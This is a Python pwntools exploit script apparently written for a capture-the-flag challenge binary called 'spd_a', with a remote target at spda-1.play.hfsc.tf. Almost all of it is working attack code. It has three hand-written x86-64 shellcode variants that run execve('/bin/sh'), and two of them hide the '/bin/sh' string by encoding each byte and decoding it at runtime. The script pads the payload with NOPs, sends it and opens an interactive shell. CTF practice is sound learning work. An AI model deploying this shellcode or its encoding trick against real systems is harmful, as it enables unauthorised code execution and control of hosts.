# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *


# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./spd_a')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
init-pwndbg
hbreak *main+0x270
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'spda-1.play.hfsc.tf'
    remote_port = 40001
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

def craft_shellcode_v1():
    # invoke syscall:
    # execve("/bin/sh", ["/bin/sh", NULL], NULL);
    shellcode = asm('''
    xor     rdx, rdx
    lea rbx, [rip+binsh]
    mov     rdi, rbx
    push    rdx
    push    rbx
    mov     rsi, rsp
    mov     eax, 0x3b
    syscall

    hang:
    jmp hang

    /************* Data section *************/
    binsh:
    .ascii "/bin/sh\\0"
    ''')
    padded_shellcode = shellcode + b'\x90'*(0x1000 - len(shellcode)) # pad with NOPs
    assert(len(padded_shellcode) == 0x1000)
    return padded_shellcode

def craft_shellcode_v2():
    # invoke syscall:
    # execve("/bin/sh", ["/bin/sh", NULL], NULL);
    shellcode = asm('''
    xor     rdx, rdx
    lea rbx, [rip+binsh]
    sub byte ptr [rbx+0], 0x1
    sub byte ptr [rbx+1], 0x1
    sub byte ptr [rbx+2], 0x1
    sub byte ptr [rbx+3], 0x1
    sub byte ptr [rbx+4], 0x1
    sub byte ptr [rbx+5], 0x1
    sub byte ptr [rbx+6], 0x1
    sub byte ptr [rbx+7], 0x1
    mov     rdi, rbx
    push    rdx
    push    rbx
    mov     rsi, rsp
    mov     eax, 0x3b
    syscall
    hang:
    jmp hang
    binsh: # !! is readonly
    .ascii "/0cjo0ti\1"
    ''')
    padded_shellcode = shellcode + b'\x90'*(0x1000 - len(shellcode)) # pad with NOPs
    assert(len(padded_shellcode) == 0x1000)
    return padded_shellcode

def craft_shellcode():
    # invoke syscall:
    # execve("/bin/sh", ["/bin/sh", NULL], NULL);
    shellcode = asm('''
    xor     rdx, rdx
    // lea rbx, [rip+binsh]
    mov rbx, 0x16974306f6a6330 /* hex(u64(b'0cjo0ti\1')) -- i.e. /bin/shNULL + 1 on every byte */
    push rbx
    mov rbx, rsp
    sub byte ptr [rbx+0], 0x1
    sub byte ptr [rbx+1], 0x1
    sub byte ptr [rbx+2], 0x1
    sub byte ptr [rbx+3], 0x1
    sub byte ptr [rbx+4], 0x1
    sub byte ptr [rbx+5], 0x1
    sub byte ptr [rbx+6], 0x1
    sub byte ptr [rbx+7], 0x1
    mov     rdi, rbx
    push    rdx
    push    rbx
    mov     rsi, rsp
    xor eax, eax
    mov     al, 0x3b
    syscall
    hang:
    jmp hang
    ''')
    padded_shellcode = shellcode + b'\x90'*(0x1000 - len(shellcode)) # pad with NOPs
    assert(len(padded_shellcode) == 0x1000)
    return padded_shellcode


io.recvuntil(b'c0de: ')

payload = craft_shellcode()
io.send(payload)

io.interactive()
io.close()